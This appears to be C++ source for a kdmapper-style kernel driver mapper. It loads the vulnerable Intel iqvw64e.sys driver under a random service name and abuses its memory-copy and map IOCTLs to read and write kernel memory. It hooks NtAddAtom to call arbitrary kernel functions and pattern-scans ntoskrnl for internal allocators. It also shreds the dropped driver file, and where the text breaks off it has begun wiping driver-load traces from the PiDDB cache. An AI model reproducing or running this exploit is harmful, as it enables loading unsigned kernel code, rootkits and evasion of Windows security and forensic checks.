#include "nal.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>

#include <cstddef>
#include <cstdio>
#include <cstring>
#include <vector>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")

namespace {

constexpr uint32_t kIoctl = 0x80862007;
constexpr uint32_t kPage = 0x1000;

struct CopyBuf {
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
};

struct PhysBuf {
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_physical_address;
	uint64_t address_to_translate;
};

struct MapBuf {
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_value;
	uint64_t return_virtual_address;
	uint64_t physical_address_to_map;
	uint32_t size;
};

struct UnmapBuf {
	uint64_t case_number;
	uint64_t reserved1;
	uint64_t reserved2;
	uint64_t virt_address;
	uint64_t reserved3;
	uint32_t number_of_bytes;
};

struct UStr {
	uint16_t Length;
	uint16_t MaximumLength;
	wchar_t* Buffer;
};

struct SysHandle {
	void* Object;
	uintptr_t UniqueProcessId;
	uintptr_t HandleValue;
	uint32_t GrantedAccess;
	uint16_t CreatorBackTraceIndex;
	uint16_t ObjectTypeIndex;
	uint32_t HandleAttributes;
	uint32_t Reserved;
};

struct SysHandleEx {
	uintptr_t HandleCount;
	uintptr_t Reserved;
	SysHandle Handles[1];
};

struct RtlModule {
	void* Section;
	void* MappedBase;
	void* ImageBase;
	uint32_t ImageSize;
	uint32_t Flags;
	uint16_t LoadOrderIndex;
	uint16_t InitOrderIndex;
	uint16_t LoadCount;
	uint16_t OffsetToFileName;
	uint8_t FullPathName[256];
};

struct RtlModules {
	uint32_t NumberOfModules;
	RtlModule Modules[1];
};

struct ListEntry {
	uint64_t Flink;
	uint64_t Blink;
};

struct UnicodeKernel {
	uint16_t Length;
	uint16_t MaximumLength;
	uint32_t pad;
	uint64_t Buffer;
};

struct PiEntry {
	ListEntry List;
	UnicodeKernel DriverName;
	uint32_t TimeDateStamp;
	int32_t LoadStatus;
	uint8_t extra[16];
};

struct AvlTable {
	uint8_t BalancedRoot[32];
	uint64_t OrderedPointer;
	uint32_t WhichOrderedElement;
	uint32_t NumberGenericTableElements;
	uint32_t DepthOfTree;
	uint32_t pad;
	uint64_t RestartKey;
	uint32_t DeleteCount;
	uint32_t pad2;
	uint64_t CompareRoutine;
	uint64_t AllocateRoutine;
	uint64_t FreeRoutine;
	uint64_t TableContext;
};

static_assert(sizeof(void*) == 8, "x64 only");
static_assert(offsetof(AvlTable, DeleteCount) == 0x40, "RTL_AVL_TABLE DeleteCount");
static_assert(offsetof(PiEntry, TimeDateStamp) == 0x20, "PiDDB TimeDateStamp");
static_assert(sizeof(SysHandle) == 40, "SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX");

using NtQuerySys_t = long(__stdcall*)(unsigned long, void*, unsigned long, unsigned long*);
using NtLoad_t = long(__stdcall*)(UStr*);
using NtUnload_t = long(__stdcall*)(UStr*);
using RtlInit_t = void(__stdcall*)(UStr*, wchar_t*);

NtQuerySys_t g_query = 0;
NtLoad_t g_load = 0;
NtUnload_t g_unload = 0;
RtlInit_t g_rtl_init = 0;

void fail(Nal* n, const std::string& s)
{
	n->last_error = s;
	std::fprintf(stderr, "[-] %s\n", s.c_str());
}

bool enable_priv(const wchar_t* name)
{
	HANDLE tok = 0;
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return false;
	if (!LookupPrivilegeValueW(0, name, &luid)) {
		CloseHandle(tok);
		return false;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), 0, 0);
	DWORD err = GetLastError();
	CloseHandle(tok);
	return err != ERROR_NOT_ALL_ASSIGNED;
}

bool resolve_ntdll()
{
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll) return false;
	g_query = (NtQuerySys_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
	g_load = (NtLoad_t)GetProcAddress(ntdll, "NtLoadDriver");
	g_unload = (NtUnload_t)GetProcAddress(ntdll, "NtUnloadDriver");
	g_rtl_init = (RtlInit_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
	return g_query && g_load && g_unload && g_rtl_init;
}

std::wstring random_name()
{
	static const wchar_t* alphabet = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	uint8_t bytes[12];
	if (BCryptGenRandom(0, bytes, sizeof(bytes), BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) {
		for (int i = 0; i < 12; ++i) bytes[i] = (uint8_t)(GetTickCount() + i * 17);
	}
	std::wstring s;
	for (int i = 0; i < 12; ++i) s.push_back(alphabet[bytes[i] % 62]);
	return s;
}

bool ioctl(void* device, void* buf, uint32_t size)
{
	DWORD got = 0;
	return DeviceIoControl(device, kIoctl, buf, size, 0, 0, &got, 0) != 0;
}

bool copy_mem(void* device, uint64_t dst, uint64_t src, uint64_t size)
{
	CopyBuf b = {};
	b.case_number = 0x33;
	b.source = src;
	b.destination = dst;
	b.length = size;
	return ioctl(device, &b, sizeof(b));
}

uint64_t phys_addr(void* device, uint64_t va)
{
	PhysBuf b = {};
	b.case_number = 0x25;
	b.address_to_translate = va;
	if (!ioctl(device, &b, sizeof(b))) return 0;
	return b.return_physical_address;
}

uint64_t map_io(void* device, uint64_t pa, uint32_t size)
{
	MapBuf b = {};
	b.case_number = 0x19;
	b.physical_address_to_map = pa;
	b.size = size;
	if (!ioctl(device, &b, sizeof(b))) return 0;
	return b.return_virtual_address;
}

bool unmap_io(void* device, uint64_t va, uint32_t size)
{
	UnmapBuf b = {};
	b.case_number = 0x1A;
	b.virt_address = va;
	b.number_of_bytes = size;
	return ioctl(device, &b, sizeof(b));
}

uint32_t read_dword(HKEY root, const wchar_t* path, const wchar_t* name, int* present)
{
	HKEY key = 0;
	DWORD type = 0;
	DWORD value = 0;
	DWORD cb = sizeof(value);
	*present = 0;
	if (RegOpenKeyExW(root, path, 0, KEY_READ | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) return 0;
	if (RegQueryValueExW(key, name, 0, &type, (BYTE*)&value, &cb) == ERROR_SUCCESS && type == REG_DWORD) *present = 1;
	RegCloseKey(key);
	return value;
}

bool pe_timestamp(const uint8_t* file, size_t n, uint32_t* stamp)
{
	if (n < sizeof(IMAGE_DOS_HEADER)) return false;
	auto dos = (const IMAGE_DOS_HEADER*)file;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
	if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > n) return false;
	auto nt = (const IMAGE_NT_HEADERS64*)(file + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
	if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;
	if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;
	*stamp = nt->FileHeader.TimeDateStamp;
	return true;
}

uint64_t module_base(const char* needle)
{
	ULONG need = 0;
	long st = g_query(11, 0, 0, &need);
	if (!need) return 0;
	std::vector<uint8_t> buf(need + 0x2000);
	st = g_query(11, buf.data(), (ULONG)buf.size(), &need);
	if (st < 0) return 0;
	auto mods = (RtlModules*)buf.data();
	for (uint32_t i = 0; i < mods->NumberOfModules; ++i) {
		const char* path = (const char*)mods->Modules[i].FullPathName;
		const char* name = path + mods->Modules[i].OffsetToFileName;
		if (_stricmp(name, needle) == 0) return (uint64_t)mods->Modules[i].ImageBase;
	}
	return 0;
}

bool pattern_eq(const uint8_t* data, const uint8_t* sig, const char* mask)
{
	for (size_t i = 0; mask[i]; ++i) {
		if (mask[i] == 'x' && data[i] != sig[i]) return false;
	}
	return true;
}

} // namespace

void nal_log_system_state()
{
	int p1 = 0, p2 = 0, p3 = 0;
	uint32_t block = read_dword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CI\\Config", L"VulnerableDriverBlocklistEnable", &p1);
	uint32_t vbs = read_dword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", L"EnableVirtualizationBasedSecurity", &p2);
	uint32_t hvci = read_dword(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity", L"Enabled", &p3);
	std::printf("[*] VulnerableDriverBlocklistEnable=%s%lu  VBS=%s%lu  HVCI=%s%lu\n",
		p1 ? "" : "absent/", (unsigned long)block,
		p2 ? "" : "absent/", (unsigned long)vbs,
		p3 ? "" : "absent/", (unsigned long)hvci);
	std::printf("[*] This program does not change those values. iqvw64e.sys will not load while the\n");
	std::printf("    Microsoft vulnerable-driver blocklist or Memory Integrity is enforcing.\n");
	std::printf("    If you turn either off, turn it back on and reboot after you are done.\n");
}

std::string nal_sha256_file(const std::wstring& path)
{
	HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (h == INVALID_HANDLE_VALUE) return "";
	BCRYPT_ALG_HANDLE alg = 0;
	BCRYPT_HASH_HANDLE hash = 0;
	DWORD obj_len = 0, cb = 0;
	if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, 0, 0) != 0) {
		CloseHandle(h);
		return "";
	}
	BCryptGetProperty(alg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&obj_len, sizeof(obj_len), &cb, 0);
	std::vector<uint8_t> obj(obj_len);
	std::vector<uint8_t> dig(32);
	if (BCryptCreateHash(alg, &hash, obj.data(), obj_len, 0, 0, 0) != 0) {
		BCryptCloseAlgorithmProvider(alg, 0);
		CloseHandle(h);
		return "";
	}
	uint8_t buf[1 << 16];
	DWORD got = 0;
	while (ReadFile(h, buf, sizeof(buf), &got, 0) && got) {
		if (BCryptHashData(hash, buf, got, 0) != 0) break;
	}
	BCryptFinishHash(hash, dig.data(), 32, 0);
	BCryptDestroyHash(hash);
	BCryptCloseAlgorithmProvider(alg, 0);
	CloseHandle(h);
	static const char* hexd = "0123456789abcdef";
	std::string out(64, '0');
	for (int i = 0; i < 32; ++i) {
		out[i * 2] = hexd[dig[i] >> 4];
		out[i * 2 + 1] = hexd[dig[i] & 0xF];
	}
	return out;
}

bool Nal::open_from(const std::wstring& source)
{
	if (!resolve_ntdll()) {
		fail(this, "ntdll exports missing");
		return false;
	}
	HANDLE existing = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (existing != INVALID_HANDLE_VALUE) {
		CloseHandle(existing);
		fail(this, "\\\\.\\Nal is already open. Not touching an existing Intel driver.");
		return false;
	}
	HANDLE src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (src == INVALID_HANDLE_VALUE) {
		fail(this, "cannot open the supplied driver file");
		return false;
	}
	DWORD sz = GetFileSize(src, 0);
	if (sz < 0x200 || sz > 0x2000000) {
		CloseHandle(src);
		fail(this, "supplied driver size is not plausible");
		return false;
	}
	std::vector<uint8_t> file(sz);
	DWORD got = 0;
	if (!ReadFile(src, file.data(), sz, &got, 0) || got != sz) {
		CloseHandle(src);
		fail(this, "cannot read the supplied driver file");
		return false;
	}
	CloseHandle(src);
	if (!pe_timestamp(file.data(), file.size(), &timestamp)) {
		fail(this, "supplied file is not an x64 PE");
		return false;
	}
	std::string digest = nal_sha256_file(source);
	std::printf("[*] loader file sha256 %s  TimeDateStamp 0x%08lx\n", digest.c_str(), (unsigned long)timestamp);
	std::printf("[*] expected primitive is the public Nal IOCTL. A different driver will fail the ping.\n");

	if (!enable_priv(L"SeLoadDriverPrivilege") || !enable_priv(L"SeDebugPrivilege")) {
		fail(this, "SeLoadDriverPrivilege / SeDebugPrivilege not held. Run as Administrator.");
		return false;
	}

	wchar_t temp[MAX_PATH];
	if (!GetTempPathW(MAX_PATH, temp)) {
		fail(this, "GetTempPath failed");
		return false;
	}
	service = random_name();
	filename = service + L".sys";
	directory = temp;
	path = directory + filename;

	HANDLE dst = CreateFileW(path.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (dst == INVALID_HANDLE_VALUE) {
		fail(this, "cannot write the temp driver copy");
		return false;
	}
	DWORD wrote = 0;
	BOOL okw = WriteFile(dst, file.data(), sz, &wrote, 0);
	CloseHandle(dst);
	if (!okw || wrote != sz) {
		DeleteFileW(path.c_str());
		fail(this, "short write on the temp driver copy");
		return false;
	}

	std::wstring keypath = L"SYSTEM\\CurrentControlSet\\Services\\" + service;
	HKEY key = 0;
	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, keypath.c_str(), 0, 0, 0, KEY_SET_VALUE, 0, &key, 0) != ERROR_SUCCESS) {
		DeleteFileW(path.c_str());
		fail(this, "cannot create the service key");
		return false;
	}
	DWORD type = 1, start = 3, errctl = 1;
	std::wstring image = L"\\??\\" + path;
	RegSetValueExW(key, L"ImagePath", 0, REG_SZ, (const BYTE*)image.c_str(), (DWORD)((image.size() + 1) * sizeof(wchar_t)));
	RegSetValueExW(key, L"Type", 0, REG_DWORD, (const BYTE*)&type, sizeof(type));
	RegSetValueExW(key, L"Start", 0, REG_DWORD, (const BYTE*)&start, sizeof(start));
	RegSetValueExW(key, L"ErrorControl", 0, REG_DWORD, (const BYTE*)&errctl, sizeof(errctl));
	RegCloseKey(key);

	std::wstring reg = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + service;
	std::vector<wchar_t> regbuf(reg.begin(), reg.end());
	regbuf.push_back(0);
	UStr us;
	g_rtl_init(&us, regbuf.data());
	long st = g_load(&us);
	if (st < 0) {
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, keypath.c_str());
		DeleteFileW(path.c_str());
		char msg[160];
		std::snprintf(msg, sizeof(msg), "NtLoadDriver failed: 0x%08lx. Blocklist or HVCI is the usual cause.", (unsigned long)st);
		fail(this, msg);
		return false;
	}
	device = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (device == INVALID_HANDLE_VALUE) {
		g_unload(&us);
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, keypath.c_str());
		DeleteFileW(path.c_str());
		fail(this, "driver loaded but \\\\.\\Nal did not appear. This is not the Nal primitive.");
		return false;
	}
	ntos = module_base("ntoskrnl.exe");
	ci = module_base("ci.dll");
	if (!ntos || !ci) {
		fail(this, "could not locate ntoskrnl.exe or ci.dll");
		close_and_shred();
		return false;
	}
	std::printf("[+] Nal loaded as a temp service. ntoskrnl 0x%llx ci 0x%llx\n",
		(unsigned long long)ntos, (unsigned long long)ci);
	return true;
}

void Nal::close_and_shred()
{
	if (device != INVALID_HANDLE_VALUE && device != 0) {
		CloseHandle((HANDLE)device);
		device = INVALID_HANDLE_VALUE;
	}
	if (!service.empty() && g_unload && g_rtl_init) {
		std::wstring reg = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + service;
		std::vector<wchar_t> regbuf(reg.begin(), reg.end());
		regbuf.push_back(0);
		UStr us;
		g_rtl_init(&us, regbuf.data());
		long st = g_unload(&us);
		std::printf("[*] NtUnloadDriver 0x%08lx\n", (unsigned long)st);
		std::wstring keypath = L"SYSTEM\\CurrentControlSet\\Services\\" + service;
		RegDeleteTreeW(HKEY_LOCAL_MACHINE, keypath.c_str());
	}
	if (!path.empty()) {
		HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (h != INVALID_HANDLE_VALUE) {
			DWORD sz = GetFileSize(h, 0);
			std::vector<uint8_t> junk(sz ? sz : 1);
			BCryptGenRandom(0, junk.data(), (ULONG)junk.size(), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
			DWORD wrote = 0;
			SetFilePointer(h, 0, 0, FILE_BEGIN);
			WriteFile(h, junk.data(), (DWORD)junk.size(), &wrote, 0);
			FlushFileBuffers(h);
			CloseHandle(h);
		}
		DeleteFileW(path.c_str());
		std::printf("[*] temp driver copy overwritten once and deleted (%ls). SSD wear-leveling can keep a previous copy.\n", path.c_str());
		path.clear();
	}
}

bool Nal::read(uint64_t addr, void* buf, size_t size)
{
	uint8_t* out = (uint8_t*)buf;
	while (size) {
		size_t chunk = size > kPage ? kPage : size;
		if (!copy_mem(device, (uint64_t)out, addr, chunk)) return false;
		addr += chunk;
		out += chunk;
		size -= chunk;
	}
	return true;
}

bool Nal::write(uint64_t addr, const void* buf, size_t size)
{
	const uint8_t* in = (const uint8_t*)buf;
	while (size) {
		size_t chunk = size > kPage ? kPage : size;
		if (!copy_mem(device, addr, (uint64_t)in, chunk)) return false;
		addr += chunk;
		in += chunk;
		size -= chunk;
	}
	return true;
}

bool Nal::write_ro(uint64_t addr, const void* buf, size_t size)
{
	const uint8_t* in = (const uint8_t*)buf;
	while (size) {
		uint32_t off = (uint32_t)(addr & 0xFFF);
		uint32_t chunk = (uint32_t)size;
		if (chunk > kPage - off) chunk = kPage - off;
		uint64_t pa = phys_addr(device, addr);
		if (!pa) {
			fail(this, "physical translation failed");
			return false;
		}
		uint64_t mapped = map_io(device, pa, chunk);
		if (!mapped) {
			fail(this, "MapIoSpace failed");
			return false;
		}
		bool ok = write(mapped, in, chunk);
		unmap_io(device, mapped, chunk);
		if (!ok) return false;
		addr += chunk;
		in += chunk;
		size -= chunk;
	}
	return true;
}

bool Nal::call4(uint64_t* out, uint64_t fn, uint64_t a, uint64_t b, uint64_t c, uint64_t d)
{
	if (!fn || !nt_add_atom) return false;
	uint8_t jmp[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
	std::memcpy(jmp + 2, &fn, 8);
	uint8_t saved[12];
	if (!read(nt_add_atom, saved, sizeof(saved))) return false;
	if (saved[0] == 0x48 && saved[1] == 0xB8 && saved[10] == 0xFF && saved[11] == 0xE0) {
		fail(this, "NtAddAtom is already hooked");
		return false;
	}
	if (!write_ro(nt_add_atom, jmp, sizeof(jmp))) return false;
	using Fn = uint64_t(__stdcall*)(uint64_t, uint64_t, uint64_t, uint64_t);
	auto gate = (Fn)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAddAtom");
	uint64_t ret = 0;
	if (gate) ret = gate(a, b, c, d);
	bool restored = write_ro(nt_add_atom, saved, sizeof(saved));
	if (out) *out = ret;
	return gate != 0 && restored;
}

uint64_t Nal::kernel_export(uint64_t module, const char* name)
{
	if (!module || !name) return 0;
	IMAGE_DOS_HEADER dos = {};
	IMAGE_NT_HEADERS64 nt = {};
	if (!read(module, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
	if (!read(module + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) return 0;
	auto dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (!dir.VirtualAddress || !dir.Size || dir.Size > 0x2000000) return 0;
	std::vector<uint8_t> exp(dir.Size);
	if (!read(module + dir.VirtualAddress, exp.data(), exp.size())) return 0;
	auto ed = (IMAGE_EXPORT_DIRECTORY*)exp.data();
	if (ed->NumberOfNames > 0x20000 || ed->NumberOfFunctions > 0x20000) return 0;
	uint32_t delta = dir.VirtualAddress;
	auto in_exp = [&](uint32_t rva, uint32_t bytes) -> bool {
		return rva >= delta && bytes <= dir.Size && rva <= delta + dir.Size - bytes;
	};
	if (!in_exp(ed->AddressOfNames, ed->NumberOfNames * 4) ||
		!in_exp(ed->AddressOfNameOrdinals, ed->NumberOfNames * 2) ||
		!in_exp(ed->AddressOfFunctions, ed->NumberOfFunctions * 4)) return 0;
	auto names = (uint32_t*)(exp.data() + ed->AddressOfNames - delta);
	auto ords = (uint16_t*)(exp.data() + ed->AddressOfNameOrdinals - delta);
	auto funcs = (uint32_t*)(exp.data() + ed->AddressOfFunctions - delta);
	if ((uint8_t*)names < exp.data() || (uint8_t*)ords < exp.data() || (uint8_t*)funcs < exp.data()) return 0;
	for (uint32_t i = 0; i < ed->NumberOfNames; ++i) {
		if (names[i] < delta || names[i] >= delta + dir.Size) continue;
		const char* cur = (const char*)(exp.data() + names[i] - delta);
		if (_stricmp(cur, name) != 0) continue;
		uint16_t ord = ords[i];
		if (ord >= ed->NumberOfFunctions) return 0;
		uint32_t rva = funcs[ord];
		if (rva >= dir.VirtualAddress && rva < dir.VirtualAddress + dir.Size) return 0;
		return module + rva;
	}
	return 0;
}

uint64_t Nal::find_pattern(uint64_t start, uint32_t size, const uint8_t* sig, const char* mask)
{
	if (!start || !size || !sig || !mask || size > 0x4000000) return 0;
	size_t mlen = std::strlen(mask);
	if (mlen == 0 || size < mlen) return 0;
	const uint32_t chunk = 0x100000;
	std::vector<uint8_t> buf(chunk + mlen);
	for (uint32_t off = 0; off < size; off += chunk) {
		uint32_t take = size - off;
		if (take > chunk + (uint32_t)mlen) take = chunk + (uint32_t)mlen;
		if (off && take < mlen) break;
		if (!read(start + off, buf.data(), take)) return 0;
		uint32_t limit = take - (uint32_t)mlen;
		for (uint32_t i = 0; i <= limit; ++i) {
			if (pattern_eq(buf.data() + i, sig, mask)) return start + off + i;
		}
		if (off + chunk >= size) break;
	}
	return 0;
}

uint64_t Nal::resolve_rel(uint64_t instr, int disp_off, int instr_len)
{
	int32_t rel = 0;
	if (!read(instr + disp_off, &rel, sizeof(rel))) return 0;
	return instr + instr_len + rel;
}

static uint64_t section_range(Nal* n, uint64_t module, const char* name, uint32_t* size_out)
{
	IMAGE_DOS_HEADER dos = {};
	IMAGE_NT_HEADERS64 nt = {};
	if (!n->read(module, &dos, sizeof(dos))) return 0;
	if (!n->read(module + dos.e_lfanew, &nt, sizeof(nt))) return 0;
	uint16_t nsec = nt.FileHeader.NumberOfSections;
	if (nsec > 96) return 0;
	uint32_t sec_off = dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader;
	std::vector<IMAGE_SECTION_HEADER> secs(nsec);
	if (!n->read(module + sec_off, secs.data(), nsec * sizeof(IMAGE_SECTION_HEADER))) return 0;
	for (uint16_t i = 0; i < nsec; ++i) {
		char secname[9] = {};
		std::memcpy(secname, secs[i].Name, 8);
		if (std::strcmp(secname, name) == 0) {
			if (size_out) *size_out = secs[i].Misc.VirtualSize;
			return module + secs[i].VirtualAddress;
		}
	}
	return 0;
}

bool Nal::resolve_helpers()
{
	nt_add_atom = kernel_export(ntos, "NtAddAtom");
	ex_alloc = kernel_export(ntos, "ExAllocatePoolWithTag");
	ex_free = kernel_export(ntos, "ExFreePool");
	ke_delay = kernel_export(ntos, "KeDelayExecutionThread");
	if (!nt_add_atom || !ex_alloc || !ex_free || !ke_delay) {
		fail(this, "missing ntoskrnl export (NtAddAtom / ExAllocatePoolWithTag / ExFreePool / KeDelayExecutionThread)");
		return false;
	}
	uint32_t text_size = 0;
	uint64_t text = section_range(this, ntos, ".text", &text_size);
	const uint8_t alloc_sig[] = { 0x41, 0x8B, 0xD6, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xE8, 0, 0, 0, 0, 0x48, 0x8B, 0xD8 };
	uint64_t hit = text ? find_pattern(text, text_size, alloc_sig, "xxxxxxxxx????xxx") : 0;
	if (!hit) {
		fail(this, "MmAllocateIndependentPagesEx pattern missed. It is published for 1803 through 24H2 and was not re-validated on this machine.");
		return false;
	}
	/* The relative call is only accepted when the addend byte is E8.
	   A miss is a miss: resolving a non-call produces an address that call4 would jump to. */
	auto call_target = [&](uint64_t site, int add, const char* what) -> uint64_t {
		uint8_t op = 0;
		if (!site || add < 0 || !read(site + (uint64_t)add, &op, 1) || op != 0xE8) {
			fail(this, std::string(what) + " pattern did not land on E8");
			return 0;
		}
		return resolve_rel(site + (uint64_t)add, 1, 5);
	};
	mm_alloc_pages = call_target(hit, 8, "MmAllocateIndependentPagesEx");
	if (!mm_alloc_pages) return false;

	uint32_t page_size = 0;
	uint64_t page = section_range(this, ntos, "PAGE", &page_size);
	const uint8_t free1[] = { 0xBA, 0x00, 0x60, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0, 0, 0, 0, 0x48, 0x8D, 0x8B, 0x00, 0xF0, 0xFF, 0xFF };
	const uint8_t free2[] = { 0x8B, 0x15, 0, 0, 0, 0, 0x48, 0x8B, 0xCB, 0xE8, 0, 0, 0, 0, 0x48, 0x8D, 0x8B };
	hit = page ? find_pattern(page, page_size, free1, "xxxxxxxxx????xxxxxxx") : 0;
	int free_add = 8;
	if (!hit && page) {
		hit = find_pattern(page, page_size, free2, "xx????xxxx????xxx");
		free_add = 9;
		if (hit) std::printf("[*] MmFreeIndependentPages matched the second published pattern\n");
	}
	if (!hit) {
		fail(this, "MmFreeIndependentPages pattern missed");
		return false;
	}
	mm_free_pages = call_target(hit, free_add, "MmFreeIndependentPages");
	if (!mm_free_pages) return false;

	uint32_t pagelk_size = 0;
	uint64_t pagelk = section_range(this, ntos, "PAGELK", &pagelk_size);
	const uint8_t prot1[] = { 0x0F, 0x45, 0, 0, 0x8D, 0, 0, 0, 0xFF, 0xFF, 0xE8 };
	/* 20 bytes. The call is the last byte (index 19), not index 13.
	   The circulating kdmapper copy uses a 17-character mask and adds 13, which
	   does not land on this E8. */
	const uint8_t prot2[] = { 0x0F, 0x45, 0, 0, 0x45, 0x8B, 0, 0, 0, 0, 0x8D, 0, 0, 0, 0, 0, 0, 0xFF, 0xFF, 0xE8 };
	hit = pagelk ? find_pattern(pagelk, pagelk_size, prot1, "xx??x???xxx") : 0;
	int prot_add = 10;
	if (!hit && pagelk) {
		hit = find_pattern(pagelk, pagelk_size, prot2, "xx??xx????x??????xxx");
		prot_add = 19;
	}
	if (!hit) {
		fail(this, "MmSetPageProtection pattern missed");
		return false;
	}
	mm_set_prot = call_target(hit, prot_add, "MmSetPageProtection");
	if (!mm_alloc_pages || !mm_free_pages || !mm_set_prot) {
		fail(this, "helper resolution produced a null address");
		return false;
	}
	std::printf("[+] helpers NtAddAtom 0x%llx alloc 0x%llx free 0x%llx prot 0x%llx\n",
		(unsigned long long)nt_add_atom, (unsigned long long)mm_alloc_pages,
		(unsigned long long)mm_free_pages, (unsigned long long)mm_set_prot);
	return true;
}

uint64_t Nal::alloc_independent(uint64_t size)
{
	uint64_t out = 0;
	if (!call4(&out, mm_alloc_pages, size, (uint64_t)(int64_t)-1, 0, 0)) return 0;
	return out;
}

bool Nal::free_independent(uint64_t addr, uint64_t size)
{
	uint64_t out = 0;
	return call4(&out, mm_free_pages, addr, size, 0, 0);
}

bool Nal::protect(uint64_t addr, uint64_t size, uint32_t prot)
{
	uint64_t out = 0;
	if (!call4(&out, mm_set_prot, addr, size, prot, 0)) return false;
	return (out & 0xFF) != 0;
}

uint64_t Nal::alloc_pool(uint64_t size, uint32_t tag)
{
	uint64_t out = 0;
	if (!call4(&out, ex_alloc, 0, size, tag, 0)) return 0;
	return out;
}

bool Nal::free_pool(uint64_t addr)
{
	uint64_t out = 0;
	return call4(&out, ex_free, addr, 0, 0, 0);
}

bool Nal::clear_traces()
{
	uint32_t page_size = 0;
	uint64_t page = section_range(this, ntos, "PAGE", &page_size);
	if (!page) {
		fail(this, "ntoskrnl PAGE section missing");
		return false;
	}
	const uint8_t lock1[] = {
		0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0, 0, 0, 0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0, 0, 0, 0,
		0x66, 0xFF, 0x88, 0, 0, 0, 0, 0xB2, 0x01, 0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0x4C, 0x8B, 0, 0x24
	};
	const uint8_t lock2[] = {
		0x48, 0x8B, 0x0D, 0, 0, 0, 0, 0x48, 0x85, 0xC9, 0x0F, 0x85, 0, 0, 0, 0, 0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xE8, 0, 0, 0, 0, 0xE8
	};
	const uint8_t lock3[] = {
		0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0, 0, 0, 0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0, 0, 0, 0,
		0x48, 0x8D, 0x0D, 0, 0, 0, 0, 0xB2, 0x01, 0x66, 0xFF, 0x88, 0, 0, 0, 0, 0x90, 0xE8, 0, 0, 0, 0, 0x4C, 0x8B, 0, 0x24
	};
	uint64_t lock_ptr = find_pattern(page, page_size, lock1, "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
	int lock_add = 28;
	const char* lock_which = "22000-style";
	if (!lock_ptr) {
		lock_ptr = find_pattern(page, page_size, lock2, "xxx????xxxxx????xxx????x????x");
		lock_add = 16;
		lock_which = "22449-style";
	}
	if (!lock_ptr) {
		lock_ptr = find_pattern(page, page_size, lock3, "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
		lock_add = 19;
		lock_which = "26100-style";
	}
	const uint8_t tab1[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
	const uint8_t tab2[] = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
